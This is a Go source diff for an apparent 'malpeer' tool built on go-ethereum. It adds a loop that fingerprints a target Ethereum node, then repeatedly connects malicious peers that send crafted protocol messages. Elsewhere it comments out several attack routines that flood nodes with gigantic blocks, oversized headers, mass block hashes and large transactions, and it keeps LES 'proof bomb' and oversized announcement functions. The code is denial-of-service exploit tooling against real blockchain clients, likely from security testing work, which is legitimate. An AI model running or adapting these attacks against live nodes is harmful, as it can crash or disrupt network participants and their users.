@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"github.com/ethereum/go-ethereum/common"
-	"github.com/ethereum/go-ethereum/core/types"
 	"github.com/ethereum/go-ethereum/crypto"
 	"github.com/ethereum/go-ethereum/eth"
 	"github.com/ethereum/go-ethereum/les"
@@ -91,6 +90,20 @@ func malPeer(c *cli.Context) error {
 	}
 	log.Info("Fingerprinting done")
 	dc.printInfo()
+	a := newAttacker(dc)
+	for protos := a.next(); protos != nil; protos = a.next(){
+		srv, _ := createServer()
+		srv.Protocols = protos
+		log.Info("Starting server")
+		if err := srv.Start(); err != nil {
+			return err
+		}
+		srv.AddPeer(node)
+		time.Sleep(2 * time.Second)
+		a.waitForCompletion()
+		srv.Stop()
+	}
+
 	return nil
 }
 
@@ -103,25 +116,26 @@ func createServer() (*p2p.Server, error) {
 	serverConfig.PrivateKey = pkey
 	serverConfig.Logger = log.New()
 	serverConfig.Name = "malpeer 0.1"
+	//serverConfig.Name = veryLargeString(10)
 	srv := &p2p.Server{Config: serverConfig}
 	srv.Logger.Info("Starting peer-to-peer node", "instance", serverConfig.Name)
 	return srv, nil
 }
 
-func handleBlockHeadersMsg(msg p2p.Msg, rw p2p.MsgReadWriter) error {
-	request := &getBlockHeadersData{}
-	err := msg.Decode(request)
-	if err != nil {
-		return err
-	}
-	log.Info("Remote peer requested block headers",
-		"origin", request.Origin,
-		"amount", request.Amount,
-		"skip", request.Skip,
-		"reverse", request.Reverse)
-	return nil
-
-}
+//func handleBlockHeadersMsg(msg p2p.Msg, rw p2p.MsgReadWriter) error {
+//	request := &getBlockHeadersData{}
+//	err := msg.Decode(request)
+//	if err != nil {
+//		return err
+//	}
+//	log.Info("Remote peer requested block headers",
+//		"origin", request.Origin,
+//		"amount", request.Amount,
+//		"skip", request.Skip,
+//		"reverse", request.Reverse)
+//	return nil
+//
+//}
 
 func lesSendLargeAnnounceMessage(rw p2p.MsgReadWriter) error {
 	var announcement = largeLesAccouncement()
@@ -134,30 +148,30 @@ func lesRequestProofV2Bomb(rw p2p.MsgReadWriter, remoteBlockHash common.Hash) er
 	return p2p.Send(rw, les.GetProofsV2Msg, lessV2ProofBomb(remoteBlockHash))
 }
 
-func sendEthAnnounceMessage(rw p2p.MsgReadWriter) error {
-	//newData := largeNewBlockData()
-	newData := randomNewBlockData()
-	err := p2p.Send(rw, eth.NewBlockMsg, newData)
-	return err
-}
+//func sendEthAnnounceMessage(rw p2p.MsgReadWriter) error {
+//	//newData := largeNewBlockData()
+//	newData := randomNewBlockData()
+//	err := p2p.Send(rw, eth.NewBlockMsg, newData)
+//	return err
+//}
 
-func ethSendRandomBlockHashes(rw p2p.MsgReadWriter) error {
-	data := randomBlockHashes(100)
-	err := p2p.Send(rw, eth.NewBlockHashesMsg, data)
-	return err
-}
+//func ethSendRandomBlockHashes(rw p2p.MsgReadWriter) error {
+//	data := randomBlockHashes(100)
+//	err := p2p.Send(rw, eth.NewBlockHashesMsg, data)
+//	return err
+//}
 
-func ethSendLargeBlockHeaders(rw p2p.MsgReadWriter) error {
-	data := []*types.Header{largeHeader(), largeHeader()}
-	err := p2p.Send(rw, eth.BlockHeadersMsg, data)
-	return err
-}
+//func ethSendLargeBlockHeaders(rw p2p.MsgReadWriter) error {
+//	data := []*types.Header{largeHeader(), largeHeader()}
+//	err := p2p.Send(rw, eth.BlockHeadersMsg, data)
+//	return err
+//}
 
-func ethSendManyTransactions(rw p2p.MsgReadWriter) error {
-
-	err := p2p.Send(rw, eth.TxMsg, largeTxs())
-	return err
-}
+//func ethSendManyTransactions(rw p2p.MsgReadWriter) error {
+//
+//	err := p2p.Send(rw, eth.TxMsg, largeTxs())
+//	return err
+//}
 
 func mirrorLesStatusMessage(msg p2p.Msg, rw p2p.MsgReadWriter) error {
 	var remoteStatus keyValueList
@@ -277,167 +291,127 @@ func lesPeerRun(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
 	return nil
 
 }
-func ethPeerLargeAnnounceAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
-	onPeer(peer)
-	errc := make(chan error, 1)
-	go func() {
-		msg, err := rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if err != nil {
-			errc <- err
-			return
-		}
-		log.Info("msg", "code", msg.Code, "size", msg.Size)
-		if msg.Code == eth.StatusMsg {
-			if err = handleStatusMessage(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		msg, err = rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if msg.Code == eth.GetBlockHeadersMsg {
-			if err = handleBlockHeadersMsg(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		log.Info("Sending gigantic block")
-		err = sendEthAnnounceMessage(rw)
 
-	}()
+//func ethPeerLargeBlockHeadersAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
+//	onPeer(peer)
+//	errc := make(chan error, 1)
+//	go func() {
+//		msg, err := rw.ReadMsg()
+//		log.Info("read message", "message", msg, "error", err)
+//		if err != nil {
+//			errc <- err
+//			return
+//		}
+//		log.Info("msg", "code", msg.Code, "size", msg.Size)
+//		if msg.Code == eth.StatusMsg {
+//			if err = handleStatusMessage(msg, rw); err != nil {
+//				errc <- err
+//				return
+//			}
+//		}
+//		msg, err = rw.ReadMsg()
+//		log.Info("read message", "message", msg, "error", err)
+//		if msg.Code == eth.GetBlockHeadersMsg {
+//			if err = handleBlockHeadersMsg(msg, rw); err != nil {
+//				errc <- err
+//				return
+//			}
+//		}
+//		log.Info("Sending gigantic block headers")
+//		err = ethSendLargeBlockHeaders(rw)
+//
+//	}()
+//
+//	select {
+//	case err := <-errc:
+//		log.Info("Got error", "error", err)
+//		return err
+//	case <-time.After(20 * time.Second):
+//		fmt.Println("timeout 1")
+//	}
+//	log.Info("peer runner exiting")
+//	return nil
+//}
 
-	select {
-	case err := <-errc:
-		log.Info("Got error", "error", err)
-		return err
-	case <-time.After(20 * time.Second):
-		fmt.Println("timeout 1")
-	}
-	log.Info("peer runner exiting")
-	return nil
-}
-
-func ethPeerLargeBlockHeadersAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
-	onPeer(peer)
-	errc := make(chan error, 1)
-	go func() {
-		msg, err := rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if err != nil {
-			errc <- err
-			return
-		}
-		log.Info("msg", "code", msg.Code, "size", msg.Size)
-		if msg.Code == eth.StatusMsg {
-			if err = handleStatusMessage(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		msg, err = rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if msg.Code == eth.GetBlockHeadersMsg {
-			if err = handleBlockHeadersMsg(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		log.Info("Sending gigantic block headers")
-		err = ethSendLargeBlockHeaders(rw)
-
-	}()
-
-	select {
-	case err := <-errc:
-		log.Info("Got error", "error", err)
-		return err
-	case <-time.After(20 * time.Second):
-		fmt.Println("timeout 1")
-	}
-	log.Info("peer runner exiting")
-	return nil
-}
-
-func ethPeerLargeBlockHashesAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
-	onPeer(peer)
-	errc := make(chan error, 1)
-	go func() {
-		msg, err := rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if err != nil {
-			errc <- err
-			return
-		}
-		log.Info("msg", "code", msg.Code, "size", msg.Size)
-		if msg.Code == eth.StatusMsg {
-			if err = handleStatusMessage(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		msg, err = rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if msg.Code == eth.GetBlockHeadersMsg {
-			if err = handleBlockHeadersMsg(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		log.Info("Sending lots of  block hashes")
-		for i := 0; i < 100; i++ {
-			err = ethSendRandomBlockHashes(rw)
-		}
-	}()
-
-	select {
-	case err := <-errc:
-		log.Info("Got error", "error", err)
-		return err
-	case <-time.After(20 * time.Second):
-		fmt.Println("timeout 1")
-	}
-	log.Info("peer runner exiting")
-	return nil
-}
-func ethPeerLargeTransactionsAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
-	onPeer(peer)
-	errc := make(chan error, 1)
-	go func() {
-		msg, err := rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if err != nil {
-			errc <- err
-			return
-		}
-		log.Info("msg", "code", msg.Code, "size", msg.Size)
-		if msg.Code == eth.StatusMsg {
-			if err = handleStatusMessage(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		msg, err = rw.ReadMsg()
-		log.Info("read message", "message", msg, "error", err)
-		if msg.Code == eth.GetBlockHeadersMsg {
-			if err = handleBlockHeadersMsg(msg, rw); err != nil {
-				errc <- err
-				return
-			}
-		}
-		log.Info("Sending lots of  large transactions")
-		for i := 0; i < 100; i++ {
-			err = ethSendManyTransactions(rw)
-		}
-	}()
-
-	select {
-	case err := <-errc:
-		log.Info("Got error", "error", err)
-		return err
-	case <-time.After(20 * time.Second):
-		fmt.Println("timeout 1")
-	}
-	log.Info("peer runner exiting")
-	return nil
-}
+//func ethPeerLargeBlockHashesAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
+//	onPeer(peer)
+//	errc := make(chan error, 1)
+//	go func() {
+//		msg, err := rw.ReadMsg()
+//		log.Info("read message", "message", msg, "error", err)
+//		if err != nil {
+//			errc <- err
+//			return
+//		}
+//		log.Info("msg", "code", msg.Code, "size", msg.Size)
+//		if msg.Code == eth.StatusMsg {
+//			if err = handleStatusMessage(msg, rw); err != nil {
+//				errc <- err
+//				return
+//			}
+//		}
+//		msg, err = rw.ReadMsg()
+//		log.Info("read message", "message", msg, "error", err)
+//		if msg.Code == eth.GetBlockHeadersMsg {
+//			if err = handleBlockHeadersMsg(msg, rw); err != nil {
+//				errc <- err
+//				return
+//			}
+//		}
+//		log.Info("Sending lots of  block hashes")
+//		for i := 0; i < 100; i++ {
+//			err = ethSendRandomBlockHashes(rw)
+//		}
+//	}()
+//
+//	select {
+//	case err := <-errc:
+//		log.Info("Got error", "error", err)
+//		return err
+//	case <-time.After(20 * time.Second):
+//		fmt.Println("timeout 1")
+//	}
+//	log.Info("peer runner exiting")
+//	return nil
+//}
+//func ethPeerLargeTransactionsAttack(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
+//	onPeer(peer)
+//	errc := make(chan error, 1)
+//	go func() {
+//		msg, err := rw.ReadMsg()
+//		log.Info("read message", "message", msg, "error", err)
+//		if err != nil {
+//			errc <- err
+//			return
+//		}
+//		log.Info("msg", "code", msg.Code, "size", msg.Size)
+//		if msg.Code == eth.StatusMsg {
+//			if err = handleStatusMessage(msg, rw); err != nil {
+//				errc <- err
+//				return
+//			}
+//		}
+//		msg, err = rw.ReadMsg()
+//		log.Info("read message", "message", msg, "error", err)
+//		if msg.Code == eth.GetBlockHeadersMsg {
+//			if err = handleBlockHeadersMsg(msg, rw); err != nil {
+//				errc <- err
+//				return
+//			}
+//		}
+//		log.Info("Sending lots of  large transactions")
+//		for i := 0; i < 100; i++ {
+//			err = ethSendManyTransactions(rw)
+//		}
+//	}()
+//
+//	select {
+//	case err := <-errc:
+//		log.Info("Got error", "error", err)
+//		return err
+//	case <-time.After(20 * time.Second):
+//		fmt.Println("timeout 1")
+//	}
+//	log.Info("peer runner exiting")
+//	return nil
+//}
